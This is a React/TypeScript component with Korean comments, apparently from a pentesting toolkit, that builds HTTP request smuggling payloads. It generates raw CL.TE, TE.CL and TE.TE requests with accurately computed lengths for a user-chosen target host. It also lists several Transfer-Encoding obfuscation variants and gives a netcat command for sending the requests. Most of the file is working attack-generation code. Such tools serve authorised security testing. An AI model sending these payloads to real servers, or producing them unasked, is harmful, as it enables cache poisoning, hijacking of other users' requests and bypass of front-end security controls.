import { useState } from 'react'
import { DISCLAIMER, Note, Pick, Readout, TextInput } from './shared'

export function HttpSmugglingBuilder() {
  const [type, setType] = useState<'CL.TE' | 'TE.CL' | 'TE.TE'>('CL.TE')
  const [host, setHost] = useState('')
  const targetHost = host.trim() || 'example.com'

  /** Content-Length를 매번 손으로 맞추면 예시가 쉽게 틀어지므로, smuggled 요청 전문의
   * 실제 바이트 길이로 계산해 CL/TE 불일치를 정확히 재현한다. */
  const getPayload = (type: string) => {
    const smuggled = `GET /smuggled HTTP/1.1\r\nHost: ${targetHost}\r\nX-Ignore: x\r\n\r\n`
    switch (type) {
      case 'CL.TE': {
        // 프론트엔드는 Content-Length만큼 그대로 전달하고, 백엔드는 Transfer-Encoding(chunked)으로
        // 해석해 "0\r\n\r\n"에서 본문이 끝났다고 보고 나머지(smuggled)를 다음 요청 버퍼에 남긴다.
        const body = `0\r\n\r\n${smuggled}`
        return `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nContent-Length: ${body.length}\r\nTransfer-Encoding: chunked\r\n\r\n${body}`
      }
      case 'TE.CL': {
        // 프론트엔드는 Transfer-Encoding(chunked)으로 전체를 정상 디코딩해 백엔드로 넘기지만,
        // 백엔드는 Content-Length만 보고 청크 크기 줄까지만 본문으로 읽어, 나머지를 다음 요청으로 처리한다.
        const chunkSizeHex = smuggled.length.toString(16)
        const firstLine = `${chunkSizeHex}\r\n`
        const body = `${firstLine}${smuggled}\r\n0\r\n\r\n`
        return `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nContent-Length: ${firstLine.length}\r\nTransfer-Encoding: chunked\r\n\r\n${body}`
      }
      case 'TE.TE':
        return `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n${smuggled}`
      default:
        return ''
    }
  }

  const teVariations = [
    { label: 'Transfer-Encoding: xchunked', code: `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n` },
    { label: 'Transfer-Encoding : chunked (Space)', code: `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n` },
    { label: 'Duplicate TE Headers', code: `POST / HTTP/1.1\r\nHost: ${targetHost}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n` },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <Pick label="공격 타입" value={type} onChange={setType} options={[{ id: 'CL.TE', label: 'CL.TE' }, { id: 'TE.CL', label: 'TE.CL' }, { id: 'TE.TE', label: 'TE.TE' }]} />
      <TextInput label="대상 Host" value={host} onChange={setHost} placeholder="example.com" />
      
      <div className="payload-readout-group">
        <strong className="payload-group-title">Raw HTTP 요청 전문 (\r\n 포함)</strong>
        <Readout title={`${type} Payload`} value={getPayload(type)} wrap="pre" />
      </div>

      {type === 'TE.TE' && (
        <div className="payload-readout-group">
          <strong className="payload-group-title">TE.TE 변형 조합</strong>
          {teVariations.map((v, i) => (
            <Readout key={i} title={v.label} value={v.code} wrap="pre" />
          ))}
        </div>
      )}

      <div className="payload-readout-group">
        <strong className="payload-group-title">전송 가이드</strong>
        <Readout title="Netcat (nc) 전송" value={`nc ${targetHost} 80`} wrap="anywhere" />
        <Note>주의: curl은 헤더를 자동 정규화하므로 raw 요청 전송 테스트에 사용할 수 없습니다. 반드시 nc 또는 전용 프록시 도구를 사용하세요.</Note>
      </div>
    </div>
  )
}

export default HttpSmugglingBuilder
